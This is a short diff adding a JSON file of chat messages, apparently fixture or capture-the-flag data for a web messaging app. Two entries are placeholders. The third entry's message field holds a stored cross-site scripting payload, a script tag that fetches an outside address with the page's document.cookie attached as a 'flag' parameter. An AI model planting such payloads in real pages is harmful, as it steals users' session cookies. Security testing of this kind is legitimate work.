@@ -1,0 +1,19 @@
+{
+    "messages": [
+        {
+            "name": "test",
+            "email": "2019-01-01T00:00:00.000Z",
+            "message": "Hello World"
+        },
+        {
+            "name": "test2",
+            "email": "2019-01-01T00:00:00.000Z",
+            "message": "Hello World"
+        },
+        {
+            "email": "haha",
+            "name": "haha",
+            "message": "<script>fetch('http://0.0.0.0:4/?flag=' + document.cookie)</script>"
+        }
+    ]
+}
